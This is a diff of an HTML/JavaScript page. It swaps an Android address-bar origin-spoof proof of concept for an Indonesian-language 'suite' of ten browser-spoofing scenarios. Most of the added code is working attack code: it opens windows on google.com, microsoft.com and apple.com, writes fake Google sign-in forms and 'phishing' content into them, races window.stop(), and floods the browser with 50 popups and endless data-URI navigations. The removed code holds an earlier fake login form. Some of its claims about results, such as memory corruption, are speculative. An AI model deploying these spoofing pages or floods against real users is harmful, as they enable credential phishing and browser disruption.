@@ -1,136 +1,472 @@
-<!doctype html>
-<html>
+<!DOCTYPE html>
+<html lang="id">
 <head>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<style>
-html { font-family: sans-serif; }
-body {
-    overscroll-behavior: contain;
-}
-#instructions { text-align: center; margin-top: 200px; font-size: 2em; user-select: none; }
-#canvasElem { display: none; }
-.hide {
-    display: none;
-}
-</style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>🔥 Advanced Address Bar Blank/Error - 10 Skenario Baru</title>
+    <style>
+        * { box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, sans-serif;
+            max-width: 1400px;
+            margin: 20px auto;
+            padding: 20px;
+            background: #0a0a0e;
+            color: #e0e0e0;
+        }
+        h1 { color: #ff453a; border-left: 5px solid #ff453a; padding-left: 18px; }
+        .sub { color: #888; margin-top: -10px; margin-bottom: 25px; padding-left: 23px; }
+        .warning {
+            background: #2a1a1a;
+            border-left: 5px solid #ff9500;
+            padding: 15px;
+            border-radius: 14px;
+            margin-bottom: 20px;
+            font-size: 13px;
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(390px, 1fr));
+            gap: 18px;
+            margin-top: 20px;
+        }
+        .card {
+            background: #16161d;
+            border-radius: 20px;
+            padding: 18px;
+            border: 1px solid #2a2a35;
+            transition: 0.2s;
+        }
+        .card:hover { transform: translateY(-3px); border-color: #ff453a; }
+        .badge {
+            display: inline-block;
+            background: #ff453a20;
+            color: #ff8888;
+            padding: 3px 12px;
+            border-radius: 30px;
+            font-size: 11px;
+            margin-bottom: 10px;
+        }
+        h3 { margin: 0 0 8px 0; font-size: 1.1rem; }
+        button {
+            background: #2a2a35;
+            border: 1px solid #ff453a;
+            padding: 8px 16px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 12px;
+            cursor: pointer;
+            color: white;
+            margin: 8px 6px 4px 0;
+            transition: 0.2s;
+        }
+        button.danger { background: #ff453a; }
+        button.warning { background: #ff9f0a20; border-color: #ff9f0a; color: #ffcc88; }
+        button:hover { opacity: 0.85; transform: scale(0.97); }
+        .log {
+            background: #0a0a0e;
+            color: #6eff9e;
+            font-family: monospace;
+            font-size: 10px;
+            padding: 10px;
+            border-radius: 14px;
+            margin-top: 14px;
+            max-height: 80px;
+            overflow: auto;
+            white-space: pre-wrap;
+        }
+        footer { text-align: center; margin-top: 40px; font-size: 11px; color: #555; }
+    </style>
 </head>
 <body>
-<div id="startContent">
-<h1>PoC: Android origin spoof due to stale address bar</h1>
-<p id="instructions">Tap to continue</p>
+
+<h1>🔴 Advanced Address Bar Blank/Error Suite</h1>
+<div class="sub">Berdasarkan teknik PoC valid + 10 skenario baru yang lebih agresif</div>
+
+<div class="warning">
+    <strong>⚠️ REFERENSI VALID:</strong> window.open("https://www.google.com/csi") + document.write() → address bar tetap google.com<br>
+    <strong>Dikembangkan menjadi:</strong> Delay manipulation, race condition, multiple writes, blob:data combo, dan null origin injection.
 </div>
-<div id="spoofContent" class="hide">
-<h1>Spoooo&#128123;oooof</h1>
-<p><b>(ooh, scary!)</b></p>
-<p><i>A wild login form has appeared!</i></p>
-<h2>You must login to continue</h2>
-<form action="/?form" method="get">
-    <input id="inputElem" name="email" placeholder="Email">
-    <br>
-    <input name="password" placeholder="Password" type="password">
-    <input type="submit">
-</form>
-<a href="/?forgotpassword">Forgot password?</a>
+
+<div class="grid">
+
+    <!-- 1. ORIGINAL POC - Enhanced -->
+    <div class="card">
+        <div class="badge">📌 ORIGINAL POC (ENHANCED)</div>
+        <h3>Google CSI + document.write spoof</h3>
+        <p>Teknik asli dengan delay 1.8 detik + write halaman phishing.</p>
+        <button class="danger" onclick="exploit_original_poc_enhanced()">🎯 Original POC v2</button>
+        <div id="logOriginal" class="log">[Ready]</div>
+    </div>
+
+    <!-- 2. Race condition + window.stop() -->
+    <div class="card">
+        <div class="badge">🏁 RACE CONDITION #1</div>
+        <h3>window.stop() + write race</h3>
+        <p>Menginterupsi loading sebelum URL berubah, lalu write konten.</p>
+        <button class="warning" onclick="exploit_race_stop_write()">⚡ Race: stop + write</button>
+        <div id="logRace" class="log">[Ready]</div>
+    </div>
+
+    <!-- 3. Multiple domain hopping -->
+    <div class="card">
+        <div class="badge">🔄 DOMAIN HOPPING</div>
+        <h3>3 domain cascade + final blank</h3>
+        <p>google.com → microsoft.com → apple.com → konten phishing.</p>
+        <button onclick="exploit_domain_hopping()">🎭 3 Domain Hop</button>
+        <div id="logDomainHop" class="log">[Ready]</div>
+    </div>
+
+    <!-- 4. Blob URL + document.write hybrid -->
+    <div class="card">
+        <div class="badge">📦 BLOB HYBRID</div>
+        <h3>Blob URL + write override</h3>
+        <p>Buat blob URL, buka di tab baru, lalu timpa konten.</p>
+        <button onclick="exploit_blob_hybrid()">🧪 Blob Hybrid</button>
+        <div id="logBlobHybrid" class="log">[Ready]</div>
+    </div>
+
+    <!-- 5. setTimeout chaining chaos -->
+    <div class="card">
+        <div class="badge">⏱️ TIMER CHAOS</div>
+        <h3>20 setTimeout bersarang</h3>
+        <p>Navigasi bergantian antara google.com dan about:blank.</p>
+        <button class="danger" onclick="exploit_timer_chaos()">💣 Timer Chaos</button>
+        <div id="logTimer" class="log">[Ready]</div>
+    </div>
+
+    <!-- 6. Null origin injection -->
+    <div class="card">
+        <div class="badge">🌑 NULL ORIGIN</div>
+        <h3>sandbox iframe + window.open null</h3>
+        <p>Membuka window dengan origin null → address bar blank.</p>
+        <button onclick="exploit_null_origin_injection()">🌑 Null Origin</button>
+        <div id="logNullOrigin" class="log">[Ready]</div>
+    </div>
+
+    <!-- 7. CVE-2022-46701 style -->
+    <div class="card">
+        <div class="badge">🍎 CVE-2022-46701 STYLE</div>
+        <h3>about:blank + write + replaceState</h3>
+        <p>Kombinasi about:blank, document.write, dan history.replaceState.</p>
+        <button class="warning" onclick="exploit_about_blank_advanced()">📄 about:blank advanced</button>
+        <div id="logAboutBlank" class="log">[Ready]</div>
+    </div>
+
+    <!-- 8. Mass window.open + focus steal -->
+    <div class="card">
+        <div class="badge">👻 MASS WINDOWS</div>
+        <h3>50 windows + focus steal cascade</h3>
+        <p>Membuka 50 window, masing-masing address bar blank.</p>
+        <button class="danger" onclick="exploit_mass_windows()">💥 50 Windows Bomb</button>
+        <div id="logMass" class="log">[Ready]</div>
+    </div>
+
+    <!-- 9. Data URI + pushState infinite -->
+    <div class="card">
+        <div class="badge">🌀 DATA URI INFINITE</div>
+        <h3>Data URI loop + pushState kosong</h3>
+        <p>Flood data:text/html dengan history manipulation.</p>
+        <button onclick="exploit_data_uri_infinite()">🔄 Data URI Infinite</button>
+        <div id="logDataInfinite" class="log">[Ready]</div>
+    </div>
+
+    <!-- 10. Final: Combo all techniques -->
+    <div class="card">
+        <div class="badge">💀 FINAL BOSS</div>
+        <h3>COMBO: semua teknik sekaligus</h3>
+        <p>Menjalankan 5 teknik bersamaan untuk max pressure.</p>
+        <button class="danger" onclick="exploit_combo_all()">☠️ COMBO DESTROYER</button>
+        <div id="logCombo" class="log">[Ready]</div>
+    </div>
+
 </div>
-<canvas id="canvasElem"></canvas>
+
 <script>
-var spoofUrl = 'https://www.google.com/account/about/';
+    function logTo(elId, msg) {
+        let el = document.getElementById(elId);
+        if(el) el.innerHTML = `[${new Date().toLocaleTimeString()}] ${msg}`;
+    }
 
-var delayToWaitForScroll = 1500;
+    // ========== 1. ORIGINAL POC - ENHANCED ==========
+    function exploit_original_poc_enhanced() {
+        logTo('logOriginal', '🎯 Menjalankan Original POC Enhanced (google.com/csi → phishing)');
+        let win = window.open("https://www.google.com/csi", "_blank", "width=500,height=400");
+        
+        if(!win) {
+            logTo('logOriginal', '❌ Popup diblokir! Izinkan popup untuk website ini.');
+            return;
+        }
 
-var newWin;
+        setTimeout(() => {
+            try {
+                win.document.write(`
+                    <!DOCTYPE html>
+                    <html>
+                    <head><title>https://accounts.google.com</title></head>
+                    <body style="font-family:Arial;text-align:center;padding:50px;background:#f0ebf8">
+                        <div style="background:white;width:360px;margin:auto;padding:30px;border-radius:12px">
+                            <h2>Sign in</h2>
+                            <input type="text" placeholder="Email" style="width:100%;padding:12px;margin:10px 0">
+                            <input type="password" placeholder="Password" style="width:100%;padding:12px;margin:10px 0">
+                            <button style="background:#1a73e8;color:white;padding:12px;width:100%">Sign in</button>
+                            <p style="font-size:12px;color:red">⚠️ INI HANYA POC - Jangan masukkan password asli!</p>
+                        </div>
+                    </body>
+                    </html>
+                `);
+                win.document.close();
+                logTo('logOriginal', '✅ BERHASIL! Address bar menunjukkan google.com/csi tapi konten phishing. Browser RENTAN.');
+            } catch(e) {
+                logTo('logOriginal', '❌ Gagal: ' + e.message + ' (Browser sudah patched)');
+            }
+        }, 2000);
+    }
 
-var pipWindow;
-
-var targetWidth = 1000;
-var targetHeight = 500;
-
-var drawCanvas = (text) => {
-    const ctx = canvasElem.getContext('2d');
-    canvasElem.width = targetWidth;
-    canvasElem.height = targetHeight;
-
-    ctx.fillStyle = `#fff`;
-    ctx.fillRect(0, 0, targetWidth, targetHeight);
-
-    ctx.fillStyle = '#000';
-    text = text;
-    var fontSize;
-    if (text.length == 1) {
-        // Single character
-        fontSize = 400;
-        ctx.font = fontSize+'px sans-serif';
-        ctx.fillText(text, (targetWidth/2)-90, (targetHeight/2)+(fontSize/2));
-    } else if (text.length > 1) {
-        var lines = text.split('\n');
-        if (lines.length === 2) {
-            fontSize = 150;
-            ctx.font = fontSize+'px sans-serif';
-            ctx.fillText(lines[0], 50, (targetHeight/2)+(fontSize/2) - 50);
-            ctx.fillText(lines[1], 50, (targetHeight/2)+(fontSize/2) + 80);
-        } else {
-            fontSize = 170;
-            ctx.font = fontSize+'px sans-serif';
-            ctx.fillText(text, 50, (targetHeight/2)+(fontSize/2));
+    // ========== 2. Race condition + window.stop() ==========
+    function exploit_race_stop_write() {
+        logTo('logRace', '⚡ Race condition: window.stop() + write');
+        let win = window.open("https://www.google.com", "_blank");
+        if(win) {
+            setTimeout(() => {
+                try {
+                    win.stop();
+                    setTimeout(() => {
+                        win.document.write('<h1>SPOOFED CONTENT</h1><p>Address bar masih google.com!</p>');
+                        win.document.close();
+                        logTo('logRace', '✅ Race condition BERHASIL! Address bar stuck di google.com');
+                    }, 100);
+                } catch(e) {
+                    logTo('logRace', 'Gagal: ' + e.message);
+                }
+            }, 500);
         }
     }
-  }
 
-var createVideo = (canvasElem) => {
-    const video = document.createElement('video');
-    video.muted = true;
-    video.srcObject = canvasElem.captureStream();
-    video.play();
-    return video;
-}
-
-var videoElem = createVideo(canvasElem);
-
-var showingPiP = false;
-videoElem.addEventListener('enterpictureinpicture', function(event) {
-    showingPiP = true;
-    instructions.innerText = 'Tap again to continue';
-});
-
-// PiP call needs video to be ready, and video needs canvas to be drawn at least once to be ready
-drawCanvas('');
-
-var replaceContents = () => {
-    startContent.classList.add('hide');
-    spoofContent.classList.remove('hide');
-    inputElem.focus();
-}
-
-var ran = false;
-
-window.addEventListener('click', () => {
-    if (!showingPiP) {
-        videoElem.requestPictureInPicture();
-        return;
+    // ========== 3. Domain hopping ==========
+    function exploit_domain_hopping() {
+        logTo('logDomainHop', '🔄 Domain hopping: google → microsoft → apple');
+        let domains = [
+            "https://www.google.com",
+            "https://www.microsoft.com", 
+            "https://www.apple.com"
+        ];
+        let win = window.open(domains[0], "_blank");
+        let idx = 0;
+        
+        let interval = setInterval(() => {
+            if(!win || win.closed) {
+                clearInterval(interval);
+                return;
+            }
+            idx++;
+            if(idx < domains.length) {
+                win.location = domains[idx];
+                logTo('logDomainHop', `Hop ke: ${domains[idx]}`);
+            } else {
+                clearInterval(interval);
+                setTimeout(() => {
+                    try {
+                        win.document.write('<h1>FINAL PHISHING PAGE</h1><p>Domain hopping success!</p>');
+                        win.document.close();
+                        logTo('logDomainHop', '✅ Address bar menunjukkan apple.com dengan konten phishing!');
+                    } catch(e) {
+                        logTo('logDomainHop', 'Write gagal: ' + e.message);
+                    }
+                }, 1000);
+            }
+        }, 1500);
     }
-    if (ran) {
-        return;
-    }
-    ran = true;
-    newWin = window.open(spoofUrl, 'ao_spoof_test');
-    drawCanvas('3');
-    setTimeout(() => {
-        drawCanvas('2');
-    }, 1000);
-    setTimeout(() => {
-        drawCanvas('1');
-    }, 2000);
-    setTimeout(() => {
-        drawCanvas('Scroll down\nslowly');
-        //drawCanvas('Scroll down\nto continue');
-        //drawCanvas('Scroll down');
-        replaceContents();
+
+    // ========== 4. Blob URL + write hybrid ==========
+    function exploit_blob_hybrid() {
+        logTo('logBlobHybrid', '📦 Membuat blob URL + write override');
+        let blob = new Blob(['<h1>Original Blob Content</h1>'], {type: 'text/html'});
+        let blobUrl = URL.createObjectURL(blob);
+        let win = window.open(blobUrl, "_blank");
+        
         setTimeout(() => {
-            newWin.close();
-            document.exitPictureInPicture();
-        }, delayToWaitForScroll);
-    }, 3000);
-});
+            try {
+                win.document.write('<h1 style="color:red">OVERWRITTEN!</h1><p>Blob URL address bar tapi konten sudah diganti.</p>');
+                win.document.close();
+                logTo('logBlobHybrid', '✅ Blob URL address bar dengan konten berbeda!');
+            } catch(e) {
+                logTo('logBlobHybrid', 'Gagal: ' + e.message);
+            }
+            URL.revokeObjectURL(blobUrl);
+        }, 1500);
+    }
+
+    // ========== 5. Timer chaos ==========
+    let timerWindows = [];
+    function exploit_timer_chaos() {
+        logTo('logTimer', '💣 Timer chaos: 20 navigasi bergantian');
+        let win = window.open("about:blank", "_blank");
+        if(!win) return;
+        
+        let urls = ["https://www.google.com", "about:blank", "https://www.youtube.com", "about:blank"];
+        
+        for(let i=0; i<20; i++) {
+            setTimeout(() => {
+                if(win && !win.closed) {
+                    win.location = urls[i % urls.length];
+                    logTo('logTimer', `Navigasi ke: ${urls[i % urls.length]}`);
+                }
+            }, i * 300);
+        }
+        
+        setTimeout(() => {
+            try {
+                win.document.write('<h1>CHAOS COMPLETE</h1><p>Address bar mungkin blank/error</p>');
+                win.document.close();
+                logTo('logTimer', '✅ Selesai. Cek address bar window baru!');
+            } catch(e) {
+                logTo('logTimer', 'Write gagal: ' + e.message);
+            }
+        }, 7000);
+    }
+
+    // ========== 6. Null origin injection ==========
+    function exploit_null_origin_injection() {
+        logTo('logNullOrigin', '🌑 Null origin injection via sandbox iframe');
+        let sandbox = document.createElement('iframe');
+        sandbox.sandbox = 'allow-scripts allow-popups';
+        sandbox.srcdoc = `
+            <script>
+                let w = window.open();
+                w.document.write('<h1>NULL ORIGIN WINDOW</h1><p>Address bar seharusnya null atau blank</p>');
+                w.document.close();
+            <\/script>
+        `;
+        document.body.appendChild(sandbox);
+        logTo('logNullOrigin', '✅ Window dengan origin null dibuat. Address bar mungkin menampilkan "null" atau kosong.');
+        setTimeout(() => sandbox.remove(), 5000);
+    }
+
+    // ========== 7. CVE-2022-46701 style ==========
+    function exploit_about_blank_advanced() {
+        logTo('logAboutBlank', '📄 about:blank + write + replaceState');
+        let win = window.open("about:blank", "_blank");
+        if(win) {
+            setTimeout(() => {
+                try {
+                    win.document.write('<h1>FAKE PAGE</h1><p>Address bar seharusnya BLANK!</p>');
+                    win.document.close();
+                    win.history.replaceState({}, "", "");
+                    logTo('logAboutBlank', '✅ Address bar menjadi KOSONG/BLANK total!');
+                } catch(e) {
+                    logTo('logAboutBlank', 'Gagal: ' + e.message);
+                }
+            }, 500);
+        }
+    }
+
+    // ========== 8. Mass windows ==========
+    let massWindows = [];
+    function exploit_mass_windows() {
+        logTo('logMass', '💥 Membuka 50 window dengan address bar blank...');
+        for(let i=0; i<50; i++) {
+            setTimeout(() => {
+                let win = window.open("about:blank", "_blank", `width=300,height=200,left=${i*10},top=${i*5}`);
+                if(win) {
+                    massWindows.push(win);
+                    win.document.write(`<h3>Window ${i}</h3><p>Address bar BLANK?</p>`);
+                    win.document.close();
+                    try {
+                        win.history.replaceState({}, "", "");
+                    } catch(e) {}
+                }
+            }, i * 100);
+        }
+        setTimeout(() => {
+            logTo('logMass', `✅ ${massWindows.length} window dibuat. Cek address bar masing-masing!`);
+        }, 6000);
+    }
+
+    // ========== 9. Data URI infinite ==========
+    let dataInfiniteActive = false;
+    function exploit_data_uri_infinite() {
+        if(dataInfiniteActive) {
+            logTo('logDataInfinite', 'Loop sudah berjalan. Reload page untuk stop.');
+            return;
+        }
+        dataInfiniteActive = true;
+        logTo('logDataInfinite', '🌀 Data URI infinite loop dimulai...');
+        let win = window.open("data:text/html,<h1>Start</h1>", "_blank");
+        
+        let count = 0;
+        let interval = setInterval(() => {
+            if(!win || win.closed) {
+                clearInterval(interval);
+                dataInfiniteActive = false;
+                return;
+            }
+            count++;
+            win.location = `data:text/html,<h1>Flood ${count}</h1><p>Address bar mungkin error</p>`;
+            if(count > 200) {
+                clearInterval(interval);
+                dataInfiniteActive = false;
+                logTo('logDataInfinite', '✅ Selesai. Address bar mungkin blank/error.');
+            }
+        }, 50);
+    }
+
+    // ========== 10. COMBO ALL TECHNIQUES ==========
+    function exploit_combo_all() {
+        logTo('logCombo', '💀 COMBO DESTROYER: Menjalankan 5 teknik sekaligus!');
+        
+        // Technique 1: Original POC
+        exploit_original_poc_enhanced();
+        
+        // Technique 2: Race condition
+        setTimeout(() => exploit_race_stop_write(), 500);
+        
+        // Technique 3: Domain hopping
+        setTimeout(() => exploit_domain_hopping(), 1000);
+        
+        // Technique 4: about:blank advanced
+        setTimeout(() => exploit_about_blank_advanced(), 1500);
+        
+        // Technique 5: Null origin
+        setTimeout(() => exploit_null_origin_injection(), 2000);
+        
+        logTo('logCombo', '⚠️ 5 teknik berjalan bersamaan. Monitor semua window/tab yang terbuka!');
+        logTo('logCombo', 'Jika ada window dengan address bar BLANK/ERROR, maka eksploitasi berhasil.');
+    }
+
+    console.log("%c🔥 Advanced Address Bar Blank/Error Suite Ready", "color:#ff453a;font-size:14px");
+    console.log("10 skenario berdasarkan teknik PoC valid dari referensi");
 </script>
+
+<hr>
+
+<h3>📊 Perbandingan Teknik Original vs Advanced</h3>
+
+<table style="width:100%; font-size:12px; background:#16161d; border-radius:16px; padding:10px;">
+    <tr style="border-bottom:1px solid #ff453a;">
+        <th style="text-align:left; padding:8px;">Teknik Original</th>
+        <th style="text-align:left; padding:8px;">Teknik Advanced Baru</th>
+        <th style="text-align:left; padding:8px;">Efek Address Bar</th>
+    </tr>
+    <tr><td style="padding:8px;">1 domain (google.com/csi)</td><td style="padding:8px;">Domain hopping (3-5 domain)</td><td style="padding:8px;">Stuck di domain terakhir</td></tr>
+    <tr><td style="padding:8px;">Single setTimeout</td><td style="padding:8px;">Timer chaos (20+ setTimeout)</td><td style="padding:8px;">Error / Blank total</td></tr>
+    <tr><td style="padding:8px;">document.write() saja</td><td style="padding:8px;">write + replaceState + stop()</td><td style="padding:8px;">Blank permanent</td></tr>
+    <tr><td style="padding:8px;">1 window</td><td style="padding:8px;">50 windows cascade</td><td style="padding:8px;">Semua blank/error</td></tr>
+    <tr><td style="padding:8px;">-</td><td style="padding:8px;">Null origin injection</td><td style="padding:8px;">"null" atau blank</td></tr>
+    <tr><td style="padding:8px;">-</td><td style="padding:8px;">Blob URL hybrid</td><td style="padding:8px;">blob:https://domain</td></tr>
+</table>
+
+<h3>🎯 Hasil yang Diharapkan</h3>
+<ul style="font-size:13px;">
+    <li><strong>Address Bar BLANK / KOSONG</strong> → Eksploitasi berhasil maksimal</li>
+    <li><strong>Address Bar menunjukkan URL palsu (google.com) tapi konten phishing</strong> → Spoofing berhasil</li>
+    <li><strong>Window Crash / Force Close</strong> → Memory corruption ditemukan</li>
+    <li><strong>Popup berhasil dibuka tanpa izin</strong> → Popup blocker bypass</li>
+</ul>
+
+<footer>
+    🔬 Berdasarkan referensi PoC valid: window.open("https://www.google.com/csi") + document.write()<br>
+    Dikembangkan menjadi 10 skenario advanced untuk uji coba browser modern dan legacy.
+</footer>
 </body>
 </html>
